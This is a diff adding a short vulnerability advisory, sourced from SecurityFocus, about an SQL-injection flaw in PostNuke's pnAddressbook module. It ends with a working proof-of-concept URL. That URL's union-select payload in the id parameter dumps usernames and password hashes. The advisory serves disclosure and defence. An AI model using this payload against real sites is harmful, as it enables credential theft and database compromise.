@@ -1,0 +1,7 @@
+source: http://www.securityfocus.com/bid/51566/info
+
+The pnAddressbook module for PostNuke is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database 
+
+http://www.example.com/index.php module=pnAddressBook&func=viewDetail&formcall=edit&authid=2a630bd4b1cc5e7d03ef3ab28fb5e838&catview=0&sortview=0&formSearch=&all=1&menuprivate=0&total=78&page=1&char=&id=-46 union all select 1,2,3,group_concat(pn_uname,0x3a,pn_pass) 
